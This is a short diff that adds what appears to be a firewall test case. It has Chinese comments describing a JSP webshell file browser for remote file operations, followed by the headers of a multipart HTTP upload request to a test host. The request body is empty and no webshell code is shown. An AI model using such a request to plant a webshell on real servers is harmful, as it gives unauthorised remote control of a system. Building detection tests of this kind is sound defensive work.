@@ -1,0 +1,12 @@
+# webshell_file_browser
+# jsp文件浏览器v1.2
+# 这个jsp程序允许远程基于web文件访问和操作。可以复制、创建、移动和删除文件。
+# 可以编辑文本文件，也可以下载文件组和文件夹作为一个动态创建的zip文件。
+POST /?bid=hd_tag_m8mv25lp HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25lp
+RM-PRO-Token: caa4c2466f86084a284fb8fd86f8a609
+RM-PRO-Time: 1742808479186
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=z-ZS0gaL28fdDxZx8X1FDlZts3N9Axqp
+
